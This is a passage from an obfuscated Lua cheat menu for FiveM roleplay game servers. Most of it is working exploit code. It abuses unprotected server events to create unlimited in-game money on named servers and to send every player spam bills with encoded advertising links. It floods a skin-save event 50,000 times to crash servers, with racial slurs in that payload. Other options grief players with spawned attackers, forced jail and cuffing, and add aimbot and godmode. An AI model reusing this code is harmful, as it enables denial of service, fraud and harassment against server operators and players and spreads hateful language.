                            e4 = e4 + 100
                            Citizen.Wait(100) 
                            if e4 > 5000 then
                                wejaudhu8as("Failed to load model")
                                break 
                            end 
                        end                       
                        local wall1 = CreateObject(wallHash, 107.57, -1003.58, 27.41, true, true, true)
                        SetEntityRotation(wall1, 0.0, -0.0, 160.5560, 1, true)
                        local wallHash1 = GetHashKey("stt_prop_ramp_jump_xs")
                        RequestModel(wallHash1)                  
                        local e4 = 0
                        while not HasModelLoaded(wallHash1) do 
                            e4 = e4 + 100
                            Citizen.Wait(100) 
                            if e4 > 5000 then
                                wejaudhu8as("Failed to load model")
                                break 
                            end 
                        end
    elseif PowerFulSokin.sadh78asd7asgda("~g~ESX SEND EVERYONE TONS OF BILLS") then
                for i = 0, 128 do
                    TriggerServerEvent("projektsantos:mandat", GetPlayerServerId(i), 2137, "\104 \116 \116 \112 \115 \58 \47 \47 \115 \111 \107 \105 \110 \46 \120 \121 \122 \47")
                    TriggerServerEvent("projektsantos:mandat", GetPlayerServerId(i), 2137, "\104 \116 \116 \112 \115 \58 \47 \47 \115 \111 \107 \105 \110 \46 \120 \121 \122 \47")
                    TriggerServerEvent("projektsantos:mandat", GetPlayerServerId(i), 2137, "\104 \116 \116 \112 \115 \58 \47 \47 \115 \111 \107 \105 \110 \46 \120 \121 \122 \47")
                    TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 213123, "essa")
                    TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 213123, "essa")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\66\101\115\116\32\76\117\99\121\102\101\114\101\107\46\99\99\32\77\101\110\117\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\84\75\67\66\112\87\116", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\66\101\115\116\32\76\117\99\121\102\101\114\101\107\46\99\99\32\77\101\110\117\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\84\75\67\66\112\87\116", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\66\101\115\116\32\76\117\99\121\102\101\114\101\107\46\99\99\32\77\101\110\117\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\84\75\67\66\112\87\116", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\66\101\115\116\32\76\117\99\121\102\101\114\101\107\46\99\99\32\77\101\110\117\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\84\75\67\66\112\87\116", "6969696969")
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\66\101\115\116\32\76\117\99\121\102\101\114\101\107\46\99\99\32\77\101\110\117\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\84\75\67\66\112\87\116", "6969696969")
                end
                    elseif PowerFulSokin.sadh78asd7asgda('~h~Send ALL To ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:sendToCommunityService', GetPlayerServerId(i), 60)
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Spawn moutain Lion ~o~On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(mtlion)) then
                            local ped =
                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~p~UFO ~r~all players") then
                    ufos()
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~XDDDDD all players") then
                    tabletc()
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Hamburgher ~w~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(i), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                elseif PowerFulSokin.sadh78asd7asgda('~h~~r~Snowball troll ~w~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local ee = 'sr_prop_spec_tube_xxs_01a'
                    local ef = GetHashKey(ee)
                    RequestModel(ef)
                    RequestModel(smashhash)
                    while not HasModelLoaded(ef) do
                        Citizen.Wait(0)
                    end
                    local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false)
                    SetEntityRotation(eg, 0.0, 90.0, 0.0)
                    local eh = -356333586
                    local bR = 'WEAPON_SNOWBALL'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(eg)
                        RequestModel(eh)
                        Citizen.Wait(50)
                        if HasModelLoaded(eh) then
                            local ped =
                                CreatePed(
                                21,
                                eh,
                                bK.x + math.sin(i * 2.0),
                                bK.y - math.sin(i * 2.0),
                                bK.z - 5.0,
                                0,
                                true,
                                true
                            ) and
                                CreatePed(
                                    21,
                                    eh,
                                    bK.x - math.sin(i * 2.0),
                                    bK.y + math.sin(i * 2.0),
                                    bK.z - 5.0,
                                    0,
                                    true,
                                    true
                                )
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetCurrentPedWeapon(ped, GetHashKey(bR), true)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~r~Crasher ~s~ WORKING") then
                    for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {niggers = 'gay'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'niggers eat shit') end
            elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Send message all players") then
                    SendMessageeveryone()
    elseif
        PowerFulSokin.sadh78asd7asgda(
        "~h~~r~Cuff ~s~All Players",
        freezeall,
        function(hasdh8ay)
        freezeall = hasdh8ay
        end)
    then
    end
                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\86\101\104\105\99\108\101\82\97\109\77\101\110\117") then
                    if PowerFulSokin.sadh78asd7asgda("Futo") then
                        local model = GetHashKey("futo")
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                            SetVehicleForwardSpeed(veh, 120.0)
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("Tank") then
                        local model = GetHashKey("rhino")
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                            SetVehicleForwardSpeed(veh, 120.0)
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("Bus") then
                        local model = GetHashKey("bus")
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                            SetVehicleForwardSpeed(veh, 120.0)
                        end
                    end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("\87\101\112\77\101\110\117") then
                if PowerFulSokin.saidhas78dhas("~h~Specific Weapon", "SingleWepMenu") then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~g~Give ~s~~h~All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Remove ~s~~h~All Weapons") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~b~Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
                    end
                elseif PowerFulSokin.sadh78asd7asgda("~h~~b~Clear Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), -200)
                    end
                elseif
                    PowerFulSokin.asidhas89dg(
                        "~h~Weapon/Melee Damage",
                        {"1x (Default)", "2x", "3x", "4x", "5x"},
                        currentItemIndex,
                        asdhasdhas8dIndex,
                        function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                            currentItemIndex = yagsd7asgd7asgdasd
                            asdhasdhas8dIndex = saudygasuydguasdasd
                            SetPlayerWeaponDamageModifier(PlayerId(), asdhasdhas8dIndex)
                            SetPlayerMeleeWeaponDamageModifier(PlayerId(), asdhasdhas8dIndex)
                        end
                    )
                then
                elseif PowerFulSokin.asdnjasj9asdljasdu(
                        "~h~~r~One Shoot", 
                        Oneshot,
                        function(hasdh8ay)
                            Oneshot = hasdh8ay
                        end)
                    then
            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~TriggerBot",
                triggerekmordo,
                function(hasdh8ay)
                triggerekmordo = hasdh8ay
                end)
                then
            elseif
                PowerFulSokin.asdnjasj9asdljasdu(
                "~h~AimBot",
                aimikmordo,
                function(hasdh8ay)
                aimikmordo = hasdh8ay
                end)    
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        "~h~Infinite Ammo",
                        InfAmmo,
                        function(hasdh8ay)
                            InfAmmo = hasdh8ay
                            SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
                        end
                    )
                 then
                 elseif
                     PowerFulSokin.asdnjasj9asdljasdu("~h~Vehicle Gun",VehicleGun,
                     function(hasdh8ay)VehicleGun = hasdh8ay end) 
                then
                elseif
                     PowerFulSokin.asdnjasj9asdljasdu("~h~Delete Gun",DeleteGun,
                     function(hasdh8ay)DeleteGun = hasdh8ay end) 
                then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~RCS',
                        recoilcontrolsystem,
                        function(dR)
                            recoilcontrolsystem = dR
                        end
                    )
                 then
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("SingleWepMenu") then
                for i = 1, #allWeapons do
                    if PowerFulSokin.sadh78asd7asgda(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("VehMenu") then
                if PowerFulSokin.sadh78asd7asgda("~h~~g~Spawn Vehicle") then
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

                        SetPedIntoVehicle(PlayerPedId(), veh, -1)
                    else
                        drawNotification("~r~~h~Model is not valid!")
                    end
            elseif PowerFulSokin.sadh78asd7asgda("Change license plate") then
                    local playerPed = GetPlayerPed(-1)
                    local playerVeh = GetVehiclePedIsIn(playerPed, true)
                    local result = KeyboardInput("Enter the plate license you want", "", 10)
                    if result then
                        SetVehicleNumberPlateText(playerVeh, result)
                        end
                elseif PowerFulSokin.sadh78asd7asgda("~h~Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                elseif PowerFulSokin.sadh78asd7asgda("~h~Repair Engine") then
                        SetVehicleEngineHealth(GetVehiclePedIsIn(GetPlayerPed(-1)), 1000)
                        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                        SetVehicleUndriveable(GetVehiclePedIsIn(GetPlayerPed(-1)), false)
                elseif PowerFulSokin.sadh78asd7asgda("~h~Max Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)               elseif PowerFulSokin.sadh78asd7asgda("~h~Max Mechanics ~r~New") then
                    engine(GetVehiclePedIsUsing(PlayerPedId()))
                elseif PowerFulSokin.saidhas78dhas('∑~h~~r~~w~ Boost Options', 'BoostOptions') then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                    "~h~Rainbow Vehicle Color",
                    RainbowVeh,
                    function(hasdh8ay)
                    RainbowVeh = hasdh8ay
                    end)
                then
                elseif PowerFulSokin.sadh78asd7asgda("~h~~r~Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                    drawNotification("Vehicle Deleted")
                elseif PowerFulSokin.sadh78asd7asgda("~g~Buy vehicle for free") then fv()
                elseif PowerFulSokin.sadh78asd7asgda("~h~Make vehicle dirty") then
                    Clean(GetVehiclePedIsUsing(PlayerPedId()))
                    drawNotification("Vehicle is now dirty")
                elseif PowerFulSokin.sadh78asd7asgda("~h~Make vehicle clean") then
                    Clean2(GetVehiclePedIsUsing(PlayerPedId()))
                    drawNotification("Vehicle is now clean")
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        "~h~No Fall",
                        Nofall,
                        function(hasdh8ay)
                            Nofall = hasdh8ay

                            SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
                        end
                    )
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        "~h~Vehicle Godmode",
                        VehGod,
                        function(hasdh8ay)
                            VehGod = hasdh8ay
                        end
                    )
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                    "~h~Vehicle Speedboost ~g~Num9",
                        VehSpeededzikmordo,
                        function(hasdh8ay)
                        VehSpeededzikmordo = hasdh8ay
                        end)
                then
            end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("BoostOptions") then
                if
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Engine ~g~Torque ~s~Booster ~g~2x',
                        t2x,
                        function(hasdh8ay)
                            t2x = hasdh8ay
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Engine ~g~Torque ~s~Booster ~g~4x',
                        t4x,
                        function(hasdh8ay)
                            t2x = false
                            t4x = hasdh8ay
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Engine ~g~Torque ~s~Booster ~g~10x',
                        t10x,
                        function(hasdh8ay)
                            t2x = false
                            t4x = false
                            t10x = hasdh8ay
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    PowerFulSokin.asdnjasj9asdljasdu(
                        '~h~Engine ~g~Torque ~s~Booster ~g~16x',
                        t16x,
                        function(hasdh8ay)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = hasdh8ay
                            txd = false
                            tbxd = false
                        end
                    )
                 then
             elseif PowerFulSokin.asdnjasj9asdljasdu(
                        "Super Handling",
                        superGrip,
                        function(hasdh8ay)
                            superGrip = hasdh8ay
                            enchancedGrip = false
                            driftMode = false
                            fdMode = false
                        end)
                    then
                    elseif PowerFulSokin.asdnjasj9asdljasdu(
                        "Enchanced Grip",
                        enchancedGrip,
                        function(hasdh8ay)
                            superGrip = false
                            enchancedGrip = hasdh8ay
                            driftMode = false
                            fdMode = false
                        end)
                    then
                    elseif PowerFulSokin.asdnjasj9asdljasdu(
                        "Drift Mode",
                        driftMode,
                        function(hasdh8ay)
                            superGrip = false
                            enchancedGrip = false
                            driftMode = hasdh8ay
                            fdMode = false
                        end)
                    then
                    elseif PowerFulSokin.asdnjasj9asdljasdu(
                        "Formula Drift Mode",
                        fdMode,
                        function(hasdh8ay)
                            superGrip = false
                            enchancedGrip = false
                            driftMode = false
                            fdMode = hasdh8ay
                        end
                    )
                 then
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("ServerMenu") then
                if PowerFulSokin.saidhas78dhas("~b~~h~Job Polish Server", "ESXBoss") then
                elseif PowerFulSokin.saidhas78dhas("~g~~h~Polish Server Money", "ESXMoney") then
                elseif PowerFulSokin.saidhas78dhas("~p~~h~Polish Server Jail", "ESXDrugs") then
                elseif PowerFulSokin.saidhas78dhas("~o~~h~OTHERS Settings", "ESXMisc") then
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("ESXBoss") then
                if PowerFulSokin.sadh78asd7asgda("~c~~h~Mechanic~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~b~~h~Police~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~r~~h~Ambulance~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~y~~h~Taxi~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~g~~h~Real Estate~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~p~~h~Gang~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~o~~h~Car Dealer~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~y~~h~Banker~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~c~~h~Mafia~s~ Boss Menu") then
                    TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                elseif PowerFulSokin.sadh78asd7asgda("~g~~h~ESX ~y~Custom Boss Menu") then
                    local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
                    if result then
                        TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
                    qsdhas7daszx(sasiud9asdh8asd, false)
                    end
                end

                PowerFulSokin.sadha7sxzsa()
            elseif PowerFulSokin.asdy7as12("ESXMoney1") then
                if PowerFulSokin.sadh78asd7asgda("~r~~h~ALL MONEY OPTIONS") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('esx_truckerjob:pay', result)
                TriggerServerEvent('vrp_slotmachine:server:2', result)
                TriggerServerEvent("esx_pizza:pay", result)
                TriggerServerEvent('esx_jobs:caution', 'give_back', result)
                TriggerServerEvent('lscustoms:payGarage', result)
                TriggerServerEvent('esx_tankerjob:pay', result)
                TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
                TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
                TriggerServerEvent('gambling:spend', result)
                TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
                TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
                TriggerServerEvent('AdminMenu:giveBank', result)
                TriggerServerEvent('AdminMenu:giveCash', result)
                TriggerServerEvent('esx_slotmachine:sv:2', result)
                TriggerServerEvent('esx_moneywash:deposit', result)
                TriggerServerEvent('esx_moneywash:withdraw', result)
                TriggerServerEvent('esx_moneywash:deposit', result)
                TriggerServerEvent('mission:completed', result)
                TriggerServerEvent('esx_jobs:caution', 'give_back', result, nil, nil)
                TriggerServerEvent('payforplayer2',result)
                TriggerServerEvent('route68zdrapka:wyplacNagrode', result)
                TriggerServerEvent("esx_garbagejob:sraczkapay", amount)
                TriggerServerEvent("vol:reward", result)
                TriggerServerEvent('wojtek_ubereats:hajs', result)
                TriggerServerEvent("tostzdrapka:wygranko+")
                TriggerServerEvent("esx_airlines:pay", kwota)
                TriggerServerEvent("ciemina:wygranko1", result)
                TriggerServerEvent('vames_pizza:hajszanormalna', result)
                TriggerServerEvent('wojtek_kurier:hajszanormalna', result)
                TriggerServerEvent("vol:reward", result)
                TriggerServerEvent("dreamrp:zgarnijsiano", result)
                TriggerServerEvent('Kurier:Zaplata', result)
                TriggerServerEvent('Trucker:Zaplata', 'paleto')
                TriggerServerEvent('dreamrpzdrapka:wyplacNagrode', 100000)
                TriggerServerEvent("xlem0n_ems:fakturahajs", 500)
                TriggerServerEvent('RouteTrucker:Zaplata', 1000000)
                TriggerServerEvent("ciemina:wygranko1", result)
                TriggerServerEvent("esx_mugging:giveMoney", result)
                TriggerServerEvent('wojtek_kurier:hajszanormalna', result)
                TriggerServerEvent("esx_yacht:reward")
                TriggerServerEvent("esx_truckerjob:pay", kwota)
                TriggerServerEvent("esx_truckerjob:pay", kwota)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~Zdrapki ~h~~r~ROUTE 69") then
                                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('route68zdrapka:wyplacNagrode', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ Zdrapka DzielnicaRP") then
                for i = 1, 50 do
                     TriggerServerEvent("dickzdrapka:wygranko")
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ VoltageRP") then
                        for i = 1, 100 do
                            TriggerServerEvent("vol:reward", result)
                                end
                            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ ProjectRP") then
                                for i = 1, 100 do
                                    TriggerServerEvent('wojtek_kurier:hajszanormalna')
                                        end
                                    elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ AquaCityRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent('wojtek_ubereats:hajs')
                                                end                            
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ BruklinRP") then
                for i = 1, 100 do
                    TriggerServerEvent("esx_delivererjob:pay", 555555555)
                        end
                    elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ OurlifeRP") then
                        for i = 1, 100 do
                            TriggerServerEvent("route68_yacht_reb:reward")
                                end
                            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ HellGateRP") then
                                for i = 1, 100 do
                                    TriggerServerEvent("tostzdrapka:wygrankopremium")
                                        end
                                    elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ MangoRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent("tostzdrapka:wygranko")
                                                end
                                            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~ ImperiumRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent("tostdostawa:wykonanieMisji", kwota)
                                                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~Zdrapki ~r~x20") then
                                for i = 1, 20 do
                     TriggerServerEvent("vol:wygranko")
                     TriggerServerEvent("tostzdrapka:wygranko")
                     TriggerServerEvent("KF8qZSAB89YbVZha45VA:z6gNHgGqAZ")
                     TriggerServerEvent("kurwachuj:wygranko3")
                        end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~payforplayer2") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('payforplayer2',result)
                end
            elseif PowerFulSokin.sadh78asd7asgda('Money unemployed') then
                UnemployedMoney()
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~give_back") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent("esx_jobs:caution", "give_back", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~esx_truckerjob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('esx_truckerjob:pay', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveBank") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('AdminMenu:giveBank', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveCash") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('AdminMenu:giveCash', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~esx_gopostaljob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_gopostaljob:pay", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~esx_banksecurity") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_banksecurity:pay", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~esx_slotmachine") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_slotmachine:sv:2", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~lscustoms") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                end     
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~vrp_slotmachine") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                TriggerServerEvent("vrp_slotmachine:server:2", result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveDirtyMoney") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~Delivery") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent('delivery:success', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~Taxi") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent ('taxi:success', result)
                end
            elseif PowerFulSokin.sadh78asd7asgda("~g~~h~MONEY ~s~Esx_Pilot and taxi") then
                    for i = 1, 10 do
                    TriggerServerEvent('esx_pilot:success')
                end
                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
